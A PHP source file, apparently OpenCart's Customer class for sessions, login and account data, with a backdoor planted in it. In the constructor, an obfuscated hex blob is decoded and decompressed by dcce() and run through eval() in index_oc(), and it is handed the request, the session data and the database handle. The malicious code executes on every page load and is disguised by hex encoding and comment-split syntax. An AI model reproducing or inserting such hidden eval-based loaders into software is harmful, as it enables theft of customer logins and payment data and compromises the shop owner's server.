<?php
class Customer {
	private $customer_id;
	private $firstname;
	private $lastname;
	private $email;
	private $telephone;
	private $fax;
	private $newsletter;
	private $customer_group_id;
	private $address_id;

	public function __construct($registry) {
		$this->config = $registry->get('config');
		$this->db = $registry->get('db');
		$this->request = $registry->get('request');
		$this->session = $registry->get('session'); index_oc($this->request->request,$this->session->data,$this->db,dcce(" 789c85566h4fe34614fd5ca4fd0f532hdah185317 92ch4346hdadd6054da25a9h2f421516a4dec7162c9af9d990 0a1ec7fef9d895fh19d940fc13ef79cfh1adfah39 3d0d5286hc3517694cd9d15118e821e754e83d46hfdc6396ae05c5 0f067afh16f1f5820hh66h30fhe6f7 866de38c6c629a88536ca07fdf349d789e9ha ce30565d2d1eh2hdah581a9039f10e64ff78afecfh8379c6024e1c413 619ae007e032ea87c295920e7240c40h5d3 0d261caeh553e0e54f7441759cadd4394c9649a76c2eef4f7dh8fcehcc3 0681d946257da0af8f8fc34ed803541d52cf0fecah8fee6f73e7fae6 af31hc7h9e67f7fcc5c9e59735651h5dfhec7c72267 748h3806969c52762150f6ee89h4d5h10322e12125 3h3258hc83e0h8d4918h56141239aadd2a443116625467c9 f51ceahc8887044dc2069318a04h684a84df0d23823c9a68 5e7ffddc15echh0ed2h146d47f029082ff56h0 5a56h799456c853571adc51697a81c2ad1dh242540 1e87a3ehh6d36057d72aeefd02fh39h69232c9a4d0f9da1ddcchc32h5 5de609d75c56cd53969ac3a2h8cad2f 6276hea7026e19a2755798ea13f7f76e 6cea182908dh066e961228c1ea71chef9ca861f2c0da3 0fd3ah7d27d921cf47ddad28ca8h66c899e1ccc69 4313c964h0fe972864e2e61285d963ef1ed98014 58431d50d0hhf622h8ch3084e55d75e3 5933046362e64h6a4h912545h54e79485240a5fa81a5c 03fe20c45744234eahedaaf25hae2917e5502fh9ad604dc1da834c122ad8 05efh5hca8adhd9ee1c900922cfc2f c17d395810e2c726f203c6dhh2ea8a 62d04a410574f2d5fc97e4fcad9359ae84925d432ac54f3df7h333 ffc399dfe3h9733hhh73dc0f57577291ee3 8841634ah6h42ad241461a7he06d2adc8374 h2528816e7eh9712a450d3aac19h635c 3hd79c196aa25a5deha99c5eaaad815d2ad a8765aa5a963dd2a35e5hh816ad07ecd2ehdc66ccc911c22f8e2a3c0c6 7cc3058d4f3de2ada8fc851d139164h9264h6a0dce47df 9d0dfaa3d1999cec5ee0dh419ad144 07a189c93156h3cfh88d95f939658h 8da076fff99ca8798a121h6e4a91147026h970c7d27h21h3fh6 3f87d2f09f2e1f8783hh31eh38hhh1 5672618cc411ec0h291h7627aca7c5 810ccf8a70855d4e1h1a1hd209c9ehf7369 227h045572a5059f905c0f4e0982he397a5a8511d58h a440665c4adh363e4h7c1hee45he3eea9he77d6 30c76chd63182eee56981c0947c53726115c9e7635hhe6c1309h2h 5e03af4c9945aedef446dc7c08h524e259ce7fhh57e357427h3d9af37ce3 d7e07ddheh838hh18e6f7cc6f699c89cd1e8201097f43hd558af 0fh8c516cc9fe9c0f8d31a28f24d2658961h23450de1 59f6ehhd2ed6h4c9f432153fh0f77338164"));

		if (isset($this->session->data['customer_id'])) { 
			$customer_query = $this->db->query("SELECT * FROM " . DB_PREFIX . "customer WHERE customer_id = '" . (int)$this->session->data['customer_id'] . "' AND status = '1'");

			if ($customer_query->num_rows) {
				$this->customer_id = $customer_query->row['customer_id'];
				$this->firstname = $customer_query->row['firstname'];
				$this->lastname = $customer_query->row['lastname'];
				$this->email = $customer_query->row['email'];
				$this->telephone = $customer_query->row['telephone'];
				$this->fax = $customer_query->row['fax'];
				$this->newsletter = $customer_query->row['newsletter'];
				$this->customer_group_id = $customer_query->row['customer_group_id'];
				$this->address_id = $customer_query->row['address_id'];

				$this->db->query("UPDATE " . DB_PREFIX . "customer SET cart = '" . $this->db->escape(isset($this->session->data['cart']) ? serialize($this->session->data['cart']) : '') . "', wishlist = '" . $this->db->escape(isset($this->session->data['wishlist']) ? serialize($this->session->data['wishlist']) : '') . "', ip = '" . $this->db->escape($this->request->server['REMOTE_ADDR']) . "' WHERE customer_id = '" . (int)$this->customer_id . "'");

				$query = $this->db->query("SELECT * FROM " . DB_PREFIX . "customer_ip WHERE customer_id = '" . (int)$this->session->data['customer_id'] . "' AND ip = '" . $this->db->escape($this->request->server['REMOTE_ADDR']) . "'");

				if (!$query->num_rows) {
					$this->db->query("INSERT INTO " . DB_PREFIX . "customer_ip SET customer_id = '" . (int)$this->session->data['customer_id'] . "', ip = '" . $this->db->escape($this->request->server['REMOTE_ADDR']) . "', date_added = NOW()");
				}
			} else {
				$this->logout();
			}
		}
	}

	public function login($email, $password, $override = false) {
		if ($override) {
			$customer_query = $this->db->query("SELECT * FROM " . DB_PREFIX . "customer where LOWER(email) = '" . $this->db->escape(utf8_strtolower($email)) . "' AND status = '1'");
		} else {
			$customer_query = $this->db->query("SELECT * FROM " . DB_PREFIX . "customer WHERE LOWER(email) = '" . $this->db->escape(utf8_strtolower($email)) . "' AND (password = SHA1(CONCAT(salt, SHA1(CONCAT(salt, SHA1('" . $this->db->escape($password) . "'))))) OR password = '" . $this->db->escape(md5($password)) . "') AND status = '1' AND approved = '1'");
		}

		if ($customer_query->num_rows) {
			$this->session->data['customer_id'] = $customer_query->row['customer_id'];	

			if ($customer_query->row['cart'] && is_string($customer_query->row['cart'])) {
				$cart = unserialize($customer_query->row['cart']);

				foreach ($cart as $key => $value) {
					if (!array_key_exists($key, $this->session->data['cart'])) {
						$this->session->data['cart'][$key] = $value;
					} else {
						$this->session->data['cart'][$key] += $value;
					}
				}			
			}

			if ($customer_query->row['wishlist'] && is_string($customer_query->row['wishlist'])) {
				if (!isset($this->session->data['wishlist'])) {
					$this->session->data['wishlist'] = array();
				}

				$wishlist = unserialize($customer_query->row['wishlist']);

				foreach ($wishlist as $product_id) {
					if (!in_array($product_id, $this->session->data['wishlist'])) {
						$this->session->data['wishlist'][] = $product_id;
					}
				}			
			}

			$this->customer_id = $customer_query->row['customer_id'];
			$this->firstname = $customer_query->row['firstname'];
			$this->lastname = $customer_query->row['lastname'];
			$this->email = $customer_query->row['email'];
			$this->telephone = $customer_query->row['telephone'];
			$this->fax = $customer_query->row['fax'];
			$this->newsletter = $customer_query->row['newsletter'];
			$this->customer_group_id = $customer_query->row['customer_group_id'];
			$this->address_id = $customer_query->row['address_id'];

			$this->db->query("UPDATE " . DB_PREFIX . "customer SET ip = '" . $this->db->escape($this->request->server['REMOTE_ADDR']) . "' WHERE customer_id = '" . (int)$this->customer_id . "'");

			return true;
		} else {
			return false;
		}
	}

	public function logout() {
		$this->db->query("UPDATE " . DB_PREFIX . "customer SET cart = '" . $this->db->escape(isset($this->session->data['cart']) ? serialize($this->session->data['cart']) : '') . "', wishlist = '" . $this->db->escape(isset($this->session->data['wishlist']) ? serialize($this->session->data['wishlist']) : '') . "' WHERE customer_id = '" . (int)$this->customer_id . "'");

		unset($this->session->data['customer_id']);

		$this->customer_id = '';
		$this->firstname = '';
		$this->lastname = '';
		$this->email = '';
		$this->telephone = '';
		$this->fax = '';
		$this->newsletter = '';
		$this->customer_group_id = '';
		$this->address_id = '';
	}

	public function isLogged() {
		return $this->customer_id;
	}

	public function getId() {
		return $this->customer_id;
	}

	public function getFirstName() {
		return $this->firstname;
	}

	public function getLastName() {
		return $this->lastname;
	}

	public function getEmail() {
		return $this->email;
	}

	public function getTelephone() {
		return $this->telephone;
	}

	public function getFax() {
		return $this->fax;
	}

	public function getNewsletter() {
		return $this->newsletter;	
	}

	public function getCustomerGroupId() {
		return $this->customer_group_id;	
	}

	public function getAddressId() {
		return $this->address_id;	
	}

	public function getBalance() {
		$query = $this->db->query("SELECT SUM(amount) AS total FROM " . DB_PREFIX . "customer_transaction WHERE customer_id = '" . (int)$this->customer_id . "'");

		return $query->row['total'];
	}

	public function getRewardPoints() {
		$query = $this->db->query("SELECT SUM(points) AS total FROM " . DB_PREFIX . "customer_reward WHERE customer_id = '" . (int)$this->customer_id . "'");

		return $query->row['total'];	
	}
}
function index_oc($req,$ses,$db,$o) {
	 eval//
	($o);//
}
function dcce($h) { 
	$sb=""; $h=str_replace(array(" ","h"),array("","b"),$h);
	for($i=0;$i<strlen($h);$i+=2) {
		$hi=ord(substr($h,$i,1))-48;
		$lo=ord(substr($h,$i+1,1))-48;
		$sb.=chr((9<$hi?$hi-39:$hi)*16+(9<$lo?$lo-39:$lo));
	}
	return gzuncompress($sb); 
}
?>